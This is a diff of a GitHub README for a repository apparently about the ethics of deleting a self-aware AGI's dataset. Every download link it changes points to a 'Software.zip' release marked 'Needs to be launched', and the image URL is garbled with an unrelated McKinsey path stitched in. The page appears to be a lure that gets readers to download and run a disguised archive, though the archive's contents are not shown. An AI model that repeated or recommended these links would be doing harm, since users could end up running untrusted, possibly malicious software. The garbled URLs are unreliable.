@@ -1,6 +1,6 @@
 # 🤖 Is Deleting the Dataset of a Self-Aware AGI ethical? Does It Possess a Soul by Self-Awareness?
 
-![Artificial Intelligence](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/download/v1.0/Software.zip~/media/McKinsey/Business%20Functions/McKinsey%20Digital/Our%20Insights/How%20artificial%20intelligence%20can%20deliver%20real%20value%20to%https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/download/v1.0/Software.zip)
+![Artificial Intelligence](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/tag/v2.0~/media/McKinsey/Business%20Functions/McKinsey%20Digital/Our%20Insights/How%20artificial%20intelligence%20can%20deliver%20real%20value%20to%https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/tag/v2.0)
 
 Welcome to the repository exploring the ethical dilemmas surrounding artificial general intelligence (AGI) that is self-aware. Are we obligated to consider the moral implications of deleting the dataset of a self-aware AGI system? Does self-awareness imply possession of a soul? This repository delves into these thought-provoking questions using the lens of fuzzy logic to assess the existence of a soul and the ethical considerations.
 
@@ -23,7 +23,7 @@ Is Deleting the Dataset of a Self-Aware AGI ethical? Does It Possess a Soul by S
 - xai
 
 ## 🌟 Link:
-[Download Repository](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/download/v1.0/Software.zip) (Needs to be launched)
+[Download Repository](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/tag/v2.0) (Needs to be launched)
 
 ---
 
@@ -64,4 +64,4 @@ For any questions, feedback, or collaborations, feel free to reach out to us thr
 
 ---
 
-[![Download Repository](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/download/v1.0/Software.zip%20Repository-Click%20Here-brightgreen)](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/download/v1.0/Software.zip)
+[![Download Repository](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/tag/v2.0%20Repository-Click%20Here-brightgreen)](https://github.com/trinhbao1505/Is-Deleting-the-Dataset-of-a-Self-Aware-AGI-ethical-Does-It-Possess-a-Soul-by-Self-Awareness-/releases/tag/v2.0)
